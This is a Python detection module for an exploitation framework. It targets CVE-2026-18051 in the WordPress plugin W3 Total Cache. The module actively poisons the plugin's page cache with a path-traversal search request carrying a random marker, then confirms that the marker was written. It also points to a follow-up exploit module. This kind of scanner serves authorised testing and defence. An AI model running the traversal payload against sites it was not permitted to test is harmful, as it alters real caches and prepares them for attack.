#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""W3 Total Cache < 2.10.5 cache path file write (CVE-2026-18051)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "w3-total-cache"
_VULN_HIGH = (2, 10, 4)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "W3 Total Cache CVE-2026-18051 detect",
        "description": (
            "Detects CVE-2026-18051: search query cache poisoning writes attacker marker "
            "into page_enhanced cache files."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-18051",
        "references": ["https://www.cve.org/CVERecord?id=CVE-2026-18051"],
        "modules": ["auxiliary/admin/http/w3_total_cache_cve_2026_18051_cache_write"],
        "tags": ["web", "scanner", "wordpress", "w3-total-cache", "cve-2026-18051"],
        "agent": {
            "chain": {"suggested_followups": ["auxiliary/admin/http/w3_total_cache_cve_2026_18051_cache_write"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _host_label(self) -> str:
        t = str(getattr(self, "target", "") or "")
        t = re.sub(r"^https?://", "", t).split("/")[0].split(":")[0]
        return t or "localhost"

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        marker = f"ks{secrets.token_hex(4)}"
        seed = self.http_request(method="GET", path=self._join(f"/search/{marker}/"), allow_redirects=True)
        if not seed or "w3 total cache" not in (seed.text or "").lower():
            return False
        self.http_request(
            method="GET",
            path=self._join(f"/search/{marker}/%2e%2e%5c%2e%2e%5c"),
            allow_redirects=True,
        )
        host = self._host_label()
        for cache_path in (
            f"/wp-content/cache/page_enhanced/{host}/_index_slash_ssl.html",
            f"/wp-content/cache/page_enhanced/{host}/_index_slash.html",
        ):
            check = self.http_request(method="GET", path=self._join(cache_path), allow_redirects=False)
            if check and check.status_code == 200 and marker in (check.text or ""):
                self.set_info(
                    severity="critical",
                    reason="W3 Total Cache CVE-2026-18051 cache file write confirmed",
                    path=cache_path,
                    cve="CVE-2026-18051",
                )
                return True
        return False
